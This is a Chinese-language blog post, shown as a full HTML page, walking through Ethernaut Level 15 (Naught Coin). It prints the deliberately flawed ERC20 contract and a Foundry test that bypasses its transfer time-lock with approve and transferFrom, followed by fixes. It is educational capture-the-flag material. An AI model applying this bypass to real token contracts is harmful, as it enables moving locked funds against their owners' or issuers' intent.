<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Ethernaut Level 15: Naught Coin - ERC20 approve/transferFrom漏洞 - Kent&#39;s Blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>KENT&#39;S BLOG</span>
  </a>
</div>
    <div id="menu" class="book-menu hide">
  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
<li><a href="/">首页</a></li>
<li><a href="/archives">文章归档</a></li>
<li><a href="/categories">分类浏览</a> </li>
<li><a href="/tags">标签云</a></li>
</ul>
<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
<li><a href="/categories/Dapp">Dapp 开发</a></li>
<li><a href="/tags/solidity">智能合约</a></li>
<li><a href="/tags/blockchain">区块链技术</a></li>
<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
</ul>
<h2 id="Ethernaut-系列-🛡️"><a href="#Ethernaut-系列-🛡️" class="headerlink" title="Ethernaut 系列 🛡️"></a>Ethernaut 系列 🛡️</h2><ul>
<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
</ul>
<h3 id="基础攻击篇-1-10"><a href="#基础攻击篇-1-10" class="headerlink" title="基础攻击篇 (1-10)"></a>基础攻击篇 (1-10)</h3><ul>
<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
</ul>
<h3 id="进阶攻击篇-11-20"><a href="#进阶攻击篇-11-20" class="headerlink" title="进阶攻击篇 (11-20)"></a>进阶攻击篇 (11-20)</h3><ul>
<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
</ul>
<h3 id="高级攻击篇-21-25"><a href="#高级攻击篇-21-25" class="headerlink" title="高级攻击篇 (21-25)"></a>高级攻击篇 (21-25)</h3><ul>
<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
</ul>
<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
<li><a href="/about">关于我</a></li>
<li><a href="/repository">项目展示</a></li>
<li><a href="/books">书单推荐</a></li>
<li><a href="/links">友情链接</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <h1 id="🎯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFrom漏洞"><a href="#🎯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFrom漏洞" class="headerlink" title="🎯 Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFrom漏洞"></a>🎯 Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFrom漏洞</h1><blockquote>
<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/15">Ethernaut Level 15 - Naught Coin</a><br><strong>攻击类型</strong>: ERC20 <code>approve</code>&#x2F;<code>transferFrom</code> 漏洞<br><strong>难度</strong>: ⭐⭐☆☆☆</p>
</blockquote>
<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>作为 <code>player</code>，你初始拥有全部的 <code>NaughtCoin</code> 代币。然而，合约中的 <code>transfer</code> 函数被锁定，十年内无法转移代币。你的目标是在锁定期结束前，将你的全部代币从你的地址中转移出去。</p>
<p><img src="https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg" alt="Naught Coin Requirements"></p>
<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><p>让我们看一下 <code>NaughtCoin</code> 合约。它继承自 OpenZeppelin 的 <code>ERC20</code> 标准合约。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    uint public timeLock;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">        _mint(player, 1000000 * (10**18));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock, &quot;NaughtCoin: time lock is active&quot;);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Override transfer to lock tokens for the player</span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        return super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Other functions are inherited from ERC20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>合约通过 <code>override</code> 重写了 <code>transfer</code> 函数，并为其增加了一个 <code>lockTokens</code> 修饰符。这个修饰符会检查 <code>msg.sender</code> 是否为 <code>player</code>，如果是，则要求 <code>block.timestamp</code> 大于 <code>timeLock</code>（十年之后）。这意味着我们作为 <code>player</code>，无法直接调用 <code>transfer</code> 函数来转移代-笔。</p>
<p>然而，开发者只重写了 <code>transfer</code> 函数，却忽略了 <code>ERC20</code> 标准中的另一个重要的代币转移函数：<code>transferFrom(address from, address to, uint256 amount)</code>。</p>
<p><code>transferFrom</code> 函数允许一个地址（<code>spender</code>）在得到 <code>owner</code> 授权（<code>approve</code>）后，从 <code>owner</code> 的账户中转移代币到任何地址。</p>
<p>由于 <code>NaughtCoin</code> 合约没有重写 <code>transferFrom</code>，它将直接使用 OpenZeppelin <code>ERC20</code> 合约中的原始实现，而这个原始实现是没有 <code>lockTokens</code> 修饰符的！</p>
<p>因此，攻击路径变得清晰：</p>
<ol>
<li>我们（<code>player</code>）调用 <code>approve</code> 函数，授权给另一个地址（可以是自己，也可以是任何其他地址）转移我们的全部代币。</li>
<li>我们（或被授权的地址）调用 <code>transferFrom</code> 函数，将代币从我们的账户中转移出去。</li>
</ol>
<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><p>在 Foundry 测试中，我们可以直接模拟这个过程。我们甚至不需要一个单独的攻击合约，因为 <code>player</code> 可以授权给自己来执行 <code>transferFrom</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/15_NaughtCoin.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoinTest is Test &#123;</span><br><span class="line">    NaughtCoin instance;</span><br><span class="line">    address player1;</span><br><span class="line">    address player2;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        player1 = vm.addr(1);</span><br><span class="line">        player2 = vm.addr(2); // 一个用于接收代币的地址</span><br><span class="line">        instance = new NaughtCoin(player1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttacker() public &#123;</span><br><span class="line">        vm.startPrank(player1, player1);</span><br><span class="line"></span><br><span class="line">        // 获取 player1 的全部余额</span><br><span class="line">        uint256 playerBalance = instance.balanceOf(player1);</span><br><span class="line"></span><br><span class="line">        // 步骤 1: player1 授权给 player1 (自己) 转移全部余额</span><br><span class="line">        instance.approve(player1, playerBalance);</span><br><span class="line"></span><br><span class="line">        // 步骤 2: player1 调用 transferFrom 将自己的代币转移到 player2</span><br><span class="line">        instance.transferFrom(player1, player2, playerBalance);</span><br><span class="line"></span><br><span class="line">        // 验证结果</span><br><span class="line">        assertEq(instance.balanceOf(player1), 0);</span><br><span class="line">        assertEq(instance.balanceOf(player2), playerBalance);</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关键攻击步骤"><a href="#关键攻击步骤" class="headerlink" title="关键攻击步骤"></a>关键攻击步骤</h3><ol>
<li><strong>获取余额</strong>: 首先，确定 <code>player</code> 地址拥有的代币总量。</li>
<li><strong>授权 (<code>approve</code>)</strong>: <code>player</code> 调用 <code>instance.approve(spender, amount)</code>，其中 <code>spender</code> 是被授权的地址，<code>amount</code> 是授权额度。在这里，我们让 <code>player</code> 授权给自己全部余额。</li>
<li><strong>转移 (<code>transferFrom</code>)</strong>: <code>player</code> 调用 <code>instance.transferFrom(from, to, amount)</code>，其中 <code>from</code> 是 <code>player</code> 地址，<code>to</code> 是接收地址，<code>amount</code> 是要转移的数量。</li>
</ol>
<p>这个过程成功地绕过了 <code>transfer</code> 函数的 <code>timeLock</code> 限制。</p>
<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><ol>
<li><p><strong>完整地覆盖函数</strong>: 当继承一个标准（如ERC20）并打算修改其核心功能时，必须确保所有相关的函数都被一致地修改。在这个案例中，如果 <code>transfer</code> 被锁定，那么 <code>transferFrom</code> 也应该被同样的方式锁定。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 正确的修复方式</span><br><span class="line">function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) &#123;</span><br><span class="line">    return super.transferFrom(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用成熟的代币锁定合约</strong>: 与其自己实现时间锁，不如使用经过审计和广泛使用的解决方案，例如 OpenZeppelin 的 <code>TokenTimelock</code> 合约。这些合约已经考虑了各种边缘情况。</p>
</li>
</ol>
<h2 id="🔧-相关工具和技术"><a href="#🔧-相关工具和技术" class="headerlink" title="🔧 相关工具和技术"></a>🔧 相关工具和技术</h2><ul>
<li><strong>ERC20 标准</strong>: 深入理解ERC20代币标准的全部接口是至关重要的，包括 <code>transfer</code>, <code>approve</code>, <code>transferFrom</code>, <code>balanceOf</code>, <code>allowance</code> 等。</li>
<li><strong>函数覆盖 (<code>override</code>)</strong>: 在Solidity中，当子合约需要修改父合约的行为时，使用 <code>override</code> 关键字。但必须小心，确保所有相关的行为都被覆盖，以避免产生漏洞。</li>
<li><strong>Foundry <code>prank</code></strong>: <code>vm.startPrank</code> 是模拟特定地址（如 <code>player</code>）执行操作的强大工具，使得在测试中模拟多步攻击流程变得简单。</li>
</ul>
<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>
<ul>
<li>ERC20标准定义了一套代币交互的接口，仅仅限制其中一个（<code>transfer</code>）是不够的。</li>
<li><code>approve</code> 和 <code>transferFrom</code> 的组合是ERC20的一个核心功能，允许第三方代为转移代币。</li>
<li>在进行合约继承和函数覆盖时，必须保持逻辑的一致性，否则很容易引入漏洞。</li>
</ul>
<p><strong>攻击向量</strong>:</p>
<ul>
<li>识别出合约只限制了 <code>transfer</code> 函数，而没有限制 <code>transferFrom</code> 函数。</li>
<li>利用 <code>approve</code> 和 <code>transferFrom</code> 的标准功能来绕过不完整的安全限制。</li>
</ul>
<p><strong>防御策略</strong>:</p>
<ul>
<li>在修改继承合约的功能时，进行全面的影响分析，确保所有相关的函数都得到一致的处理。</li>
<li>优先使用经过社区审计和验证的标准实现，而不是自己重新发明轮子。</li>
</ul>
<h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul>
<li><a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-20">ERC20 Token Standard</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">OpenZeppelin ERC20 Implementation</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/contracts.html#function-overriding">Solidity Docs: Overriding</a></li>
</ul>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure
          class="avatar avatar-lg"
          data-initial="K"
          style="background-color: #3b4351;">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>Kent</div>
      <div>2025-09-09</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/">Ethernaut 系列</a> <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/%E8%BF%9B%E9%98%B6%E6%94%BB%E5%87%BB%E7%AF%87-11-20/">进阶攻击篇 (11-20)</a>

      <a class="tag-none-link" href="/tags/ERC20/" rel="tag">#ERC20</a> <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/approve/" rel="tag">#approve</a> <a class="tag-none-link" href="/tags/transferFrom/" rel="tag">#transferFrom</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
